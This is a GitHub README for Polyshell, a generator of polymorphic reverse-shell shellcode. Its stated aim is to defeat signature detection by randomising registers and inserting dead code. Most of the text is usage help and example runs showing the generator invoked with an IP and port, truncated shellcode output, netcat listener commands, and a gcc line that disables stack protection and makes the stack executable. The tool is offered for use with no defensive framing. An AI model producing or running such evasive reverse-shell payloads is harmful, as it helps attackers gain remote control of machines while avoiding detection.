
# Polyshell

Simple polymorphic reverse shell generator.\
\
This tool will randomly choose registry between `r8` to `r15` to handle the different file descriptors for the reverse shell.\
 It will also put some dead code within the shellcode so that none of the generated shell's signatures can't be identical.

```

     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
    ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 

       Simple polymorphic reverse shell generator.

                Vadimador - Ninuuu - t4yki
         https://github.com/Vadimador/polyshell

    
usage: main.py [-h] -i IP -p PORT [-e {big,little}] [-x XORNB] [-b] [-hs] [-v] [-o OUTFILE]

optional arguments:
  -h, --help            show this help message and exit
  -i IP, --ip IP        IPv4 Address
  -p PORT, --port PORT  Port to bind
  -e {big,little}, --endian {big,little}
                        Endianness of the target, default=little
  -x XORNB, --xornb XORNB
                        Number of xor to put, default=10
  -b, --build           Compile the C file
  -hs, --hide-shellcode
                        Hide the shellcode printing
  -v, --verbose         Add verbosity printing
  -o OUTFILE, --outfile OUTFILE
                        Outfile shellcode's namee
```
## Requirements

`python3.X` and additionnaly `gcc` if you desire to compile the C file.


## Installation

```bash
git clone https://github.com/Vadimador/polyshell
cd polyshell
./main.py
```

You can add the polyshell main.py to path one of your PATH to execute it from anywhere.
```
cd polyshell
ln -s $(readlink -f main.py) ~/.local/bin/polyshell
```
    
## Run

### Create a reverse shell and build it, save the shellcode in a TXT file

```bash
┌[t4yki@d3v]
└[~]> polyshell -i 127.0.0.1 -p 6666 -b -v


     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌
    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•
     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪
    ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀

       Simple polymorphic reverse shell generator.

                Vadimador - Ninuuu - t4yki
         https://github.com/Vadimador/polyshell


 [!] Shellcode generated :

\x48\x31\xc0\x48\x31...\x0f\x05


 [+] Compiled shellcode : reverse_shell
 [+] Start a listener : nc -lvnp 6666
 ```

 ### Create a reverse shell and modify the number of xor and hide shellcode printing
```bash
┌[Vadimador@d3v] 
└[~]> polyshell -i 127.0.0.1 -p 1024 -x 54 -b -v



     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌
    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•
     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪
    ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀

       Simple polymorphic reverse shell generator.

                Vadimador - Ninuuu - t4yki
         https://github.com/Vadimador/polyshell


 [!] Shellcode generated :

\x4d\x31\xc9\x4d\x31\xf6...\xff\x0f\x05    


 [+] Compiled shellcode : reverse_shell
 [+] Start a listener : nc -lvnp 1024
```

### Create a reverse shell but don't build it, just save it to C and TXT file.

```bash
┌[Ninuuu@d3v] 
└[~]> polyshell -i 127.0.0.1 -p 4444 -x 88 -v


     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌
    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•
     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪
    ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀

       Simple polymorphic reverse shell generator.

                Vadimador - Ninuuu - t4yki
         https://github.com/Vadimador/polyshell


 [!] Shellcode generated :

\x4d\x31\xc9\x4d\x31...\x0f\x05


 [+] C file to test the shellcode : reverse_shell.c
 [+] Build : gcc reverse_shell.c -o shell -fno-stack-protector -z execstack -no-pie
```
